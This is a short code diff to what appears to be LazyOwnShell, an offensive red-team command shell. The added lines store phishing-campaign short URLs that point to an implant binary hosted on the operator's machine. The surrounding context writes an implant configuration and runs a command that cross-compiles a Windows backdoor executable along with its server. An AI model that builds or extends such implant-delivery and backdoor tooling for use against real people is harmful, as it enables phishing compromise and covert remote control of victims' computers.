@@ -10976,6 +10976,32 @@ class LazyOwnShell(cmd2.Cmd):
         with open(f"{implant_config_json}", 'w+') as f:
             json.dump(json_content, f, indent=4)
 
+        json_file = self.sessions_dir + "/phishing/campaigns/short_urls.json"
+        
+        if not os.path.exists(json_file):
+            short_urls = {}
+        else:
+            with open(json_file, 'r') as f:
+                short_urls = json.load(f)
+        
+        if line in short_urls:
+            print_warn(f"Entry '{line}' already exists in short urls")
+            
+
+        new_entry = {
+            line: {
+                "original_url": f"https://{lhost}/s/{binary}",
+                "active": True,
+                "created_at": datetime.now().isoformat()
+            }
+        }
+        
+        short_urls.update(new_entry)
+        with open(json_file, 'w') as f:
+            json.dump(short_urls, f, indent=2)
+        
+        print_msg(f"Created new entry for '{line}' in shorts urls")
+
         self.onecmd("create_session_json")
         if is_port_in_use(int(lport)):
             command = "cp modules/backdoor/*.h sessions && cd sessions && x86_64-w64-mingw32-gcc -o b.exe b.c -lwininet -lwsock32 && gcc -o server server.c && cd .."
